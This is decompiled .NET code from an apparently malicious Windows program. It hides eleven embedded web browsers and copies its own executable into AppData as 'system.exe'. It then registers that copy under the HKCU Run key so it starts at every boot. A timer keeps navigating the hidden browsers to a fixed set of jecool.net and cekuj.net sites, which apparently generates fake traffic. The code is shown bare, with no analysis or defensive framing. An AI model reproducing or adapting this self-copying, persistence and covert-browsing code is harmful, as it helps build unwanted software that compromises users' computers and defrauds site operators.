					num = 69;
					if (Operators.CompareString(TextBox1.get_Text(), "17." + Min + "2.30", false) == 0)
					{
						goto IL_0679;
					}
					goto IL_06ac;
					IL_0679:
					num = 70;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0683;
					IL_0683:
					num = 71;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_06ac;
					IL_06ac:
					num = 73;
					if (Operators.CompareString(TextBox1.get_Text(), "18." + Min + "1.11", false) == 0)
					{
						goto IL_06da;
					}
					goto IL_070d;
					IL_06da:
					num = 74;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_06e4;
					IL_06e4:
					num = 75;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_070d;
					IL_070d:
					num = 77;
					if (Operators.CompareString(TextBox1.get_Text(), "19." + Min + "3.29", false) == 0)
					{
						goto IL_073b;
					}
					goto IL_076e;
					IL_073b:
					num = 78;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0745;
					IL_0745:
					num = 79;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_076e;
					IL_076e:
					num = 81;
					if (Operators.CompareString(TextBox1.get_Text(), "20." + Min + "2.38", false) == 0)
					{
						goto IL_079c;
					}
					goto IL_07cf;
					IL_079c:
					num = 82;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_07a6;
					IL_07a6:
					num = 83;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_07cf;
					IL_07cf:
					num = 85;
					if (Operators.CompareString(TextBox1.get_Text(), "21." + Min + "4.42", false) == 0)
					{
						goto IL_07fd;
					}
					goto IL_0830;
					IL_07fd:
					num = 86;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0807;
					IL_0807:
					num = 87;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0830;
					IL_0830:
					num = 89;
					if (Operators.CompareString(TextBox1.get_Text(), "22." + Min + "5.19", false) == 0)
					{
						goto IL_085e;
					}
					goto IL_0891;
					IL_085e:
					num = 90;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0868;
					IL_0868:
					num = 91;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0891;
					end_IL_0001_2:
					break;
				}
				num = 95;
				Min = Conversions.ToString(Minrn.Next(2, 4));
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2685;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 383:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0033;
						case 6:
							goto IL_0041;
						case 7:
							goto IL_004f;
						case 8:
							goto IL_005d;
						case 9:
							goto IL_0085;
						case 10:
							goto IL_0094;
						case 11:
							goto IL_00a3;
						case 12:
							goto IL_00b2;
						case 13:
							goto IL_00c1;
						case 14:
							goto IL_00d0;
						case 16:
							goto IL_00f4;
						case 17:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 15:
						case 18:
						case 19:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00f4:
					num = 16;
					break;
					IL_00d0:
					num = 14;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(AppData + "\\system.exe"))
					{
						goto end_IL_0001_3;
					}
					goto IL_00f4;
					IL_0009:
					num = 2;
					((Control)WebBrowser1).set_Visible(false);
					goto IL_0017;
					IL_0017:
					num = 3;
					((Control)WebBrowser2).set_Visible(false);
					goto IL_0025;
					IL_0025:
					num = 4;
					((Control)WebBrowser3).set_Visible(false);
					goto IL_0033;
					IL_0033:
					num = 5;
					((Control)WebBrowser4).set_Visible(false);
					goto IL_0041;
					IL_0041:
					num = 6;
					((Control)WebBrowser5).set_Visible(false);
					goto IL_004f;
					IL_004f:
					num = 7;
					((Control)WebBrowser6).set_Visible(false);
					goto IL_005d;
					IL_005d:
					num = 8;
					Min = Conversions.ToString(Conversions.ToDouble(Min) == (double)Minrn.Next(1, 5));
					goto IL_0085;
					IL_0085:
					num = 9;
					((Control)WebBrowser7).set_Visible(false);
					goto IL_0094;
					IL_0094:
					num = 10;
					((Control)WebBrowser8).set_Visible(false);
					goto IL_00a3;
					IL_00a3:
					num = 11;
					((Control)WebBrowser9).set_Visible(false);
					goto IL_00b2;
					IL_00b2:
					num = 12;
					((Control)WebBrowser10).set_Visible(false);
					goto IL_00c1;
					IL_00c1:
					num = 13;
					((Control)WebBrowser11).set_Visible(false);
					goto IL_00d0;
					end_IL_0001_2:
					break;
				}
				num = 17;
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), AppData + "\\system.exe");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 383;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void AddStartup(string Name, string Path)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		RegistryKey currentUser = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 84:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0012:
					num = 3;
					registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					break;
					IL_0009:
					num = 2;
					currentUser = Registry.CurrentUser;
					goto IL_0012;
					end_IL_0001_2:
					break;
				}
				num = 4;
				registryKey.SetValue(Name, Path, RegistryValueKind.String);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 84;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 67:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
				AddStartup("system", AppData + "\\system.exe");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 67;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void BrowserCheck_Tick(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 881:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 4:
							goto IL_002b;
						case 5:
							goto IL_002d;
						case 3:
						case 6:
						case 7:
							goto IL_003f;
						case 9:
							goto IL_0061;
						case 10:
							goto IL_0064;
						case 8:
						case 11:
						case 12:
							goto IL_0077;
						case 14:
							goto IL_009a;
						case 15:
							goto IL_009d;
						case 13:
						case 16:
						case 17:
							goto IL_00b0;
						case 19:
							goto IL_00d3;
						case 20:
							goto IL_00d6;
						case 18:
						case 21:
						case 22:
							goto IL_00e9;
						case 24:
							goto IL_010c;
						case 25:
							goto IL_010f;
						case 23:
						case 26:
						case 27:
							goto IL_0122;
						case 29:
							goto IL_0145;
						case 30:
							goto IL_0148;
						case 28:
						case 31:
						case 32:
							goto IL_015b;
						case 34:
							goto IL_017e;
						case 35:
							goto IL_0181;
						case 33:
						case 36:
						case 37:
							goto IL_0194;
						case 39:
							goto IL_01b7;
						case 40:
							goto IL_01ba;
						case 38:
						case 41:
						case 42:
							goto IL_01cd;
						case 44:
							goto IL_01f0;
						case 45:
							goto IL_01f3;
						case 43:
						case 46:
						case 47:
							goto IL_0206;
						case 49:
							goto IL_0229;
						case 50:
							goto IL_022c;
						case 48:
						case 51:
						case 52:
							goto IL_023f;
						case 54:
							goto IL_0262;
						case 55:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 53:
						case 56:
						case 57:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0262:
					num = 54;
					break;
					IL_023f:
					num = 52;
					if (Operators.CompareString(WebBrowser11.get_Url().ToString(), "http://www.dva-a-pul-chlapa-online.jecool.net/", false) == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0262;
					IL_0009:
					num = 2;
					if (Operators.CompareString(WebBrowser1.get_Url().ToString(), "http://www.simpsonovi-online.jecool.net/", false) != 0)
					{
						goto IL_002b;
					}
					goto IL_003f;
					IL_002b:
					num = 4;
					goto IL_002d;
					IL_002d:
					num = 5;
					WebBrowser1.Navigate("http://www.simpsonovi-online.jecool.net");
					goto IL_003f;
					IL_003f:
					num = 7;
					if (Operators.CompareString(WebBrowser2.get_Url().ToString(), "http://www.south-park-online.jecool.net/", false) != 0)
					{
						goto IL_0061;
					}
					goto IL_0077;
					IL_0061:
					num = 9;
					goto IL_0064;
					IL_0064:
					num = 10;
					WebBrowser2.Navigate("http://www.south-park-online.jecool.net/");
					goto IL_0077;
					IL_0077:
					num = 12;
					if (Operators.CompareString(WebBrowser3.get_Url().ToString(), "http://www.the-cleveland-show.jecool.net/", false) != 0)
					{
						goto IL_009a;
					}
					goto IL_00b0;
					IL_009a:
					num = 14;
					goto IL_009d;
					IL_009d:
					num = 15;
					WebBrowser3.Navigate("http://www.the-cleveland-show.jecool.net/");
					goto IL_00b0;
					IL_00b0:
					num = 17;
					if (Operators.CompareString(WebBrowser4.get_Url().ToString(), "http://www.fail-videa.cekuj.net/", false) != 0)
					{
						goto IL_00d3;
					}
					goto IL_00e9;
					IL_00d3:
					num = 19;
					goto IL_00d6;
					IL_00d6:
					num = 20;
					WebBrowser4.Navigate("http://www.fail-videa.cekuj.net/");
					goto IL_00e9;
					IL_00e9:
					num = 22;
					if (Operators.CompareString(WebBrowser5.get_Url().ToString(), "http://www.free-themes.cekuj.net/", false) != 0)
					{
						goto IL_010c;
					}
					goto IL_0122;
					IL_010c:
					num = 24;
					goto IL_010f;
					IL_010f:
					num = 25;
					WebBrowser5.Navigate("http://www.free-themes.cekuj.net/");
					goto IL_0122;
					IL_0122:
					num = 27;
					if (Operators.CompareString(WebBrowser6.get_Url().ToString(), "http://www.griffinovi-online.jecool.net/", false) != 0)
					{
						goto IL_0145;
					}
					goto IL_015b;
					IL_0145:
					num = 29;
					goto IL_0148;
					IL_0148:
					num = 30;
					WebBrowser6.Navigate("http://www.griffinovi-online.jecool.net/");
					goto IL_015b;
					IL_015b:
					num = 32;
					if (Operators.CompareString(WebBrowser7.get_Url().ToString(), "http://www.futurama-online.jecool.net/", false) != 0)
					{
						goto IL_017e;
					}
					goto IL_0194;
					IL_017e:
					num = 34;
					goto IL_0181;
					IL_0181:
					num = 35;
					WebBrowser7.Navigate("http://www.futurama-online.jecool.net/");
					goto IL_0194;
					IL_0194:
					num = 37;
					if (Operators.CompareString(WebBrowser8.get_Url().ToString(), "http://www.dr-house-online.jecool.net/", false) != 0)
					{
						goto IL_01b7;
					}
					goto IL_01cd;
					IL_01b7:
					num = 39;
					goto IL_01ba;
					IL_01ba:
					num = 40;
					WebBrowser8.Navigate("http://www.dr-house-online.jecool.net/");
					goto IL_01cd;
					IL_01cd:
					num = 42;
					if (Operators.CompareString(WebBrowser9.get_Url().ToString(), "http://www.jmenuju-se-earl.jecool.net/", false) != 0)
					{
						goto IL_01f0;
					}
					goto IL_0206;
					IL_01f0:
					num = 44;
					goto IL_01f3;
					IL_01f3:
					num = 45;
					WebBrowser9.Navigate("http://www.jmenuju-se-earl.jecool.net/");
					goto IL_0206;
					IL_0206:
					num = 47;
					if (Operators.CompareString(WebBrowser10.get_Url().ToString(), "http://www.htc.cekuj.net/", false) != 0)
					{
						goto IL_0229;
					}
					goto IL_023f;
					IL_0229:
					num = 49;
					goto IL_022c;
					IL_022c:
					num = 50;
					WebBrowser10.Navigate("http://www.htc.cekuj.net/");
					goto IL_023f;
					end_IL_0001_2:
					break;
				}
				num = 55;
				WebBrowser11.Navigate("http://www.dva-a-pul-chlapa-online.jecool.net/");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 881;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
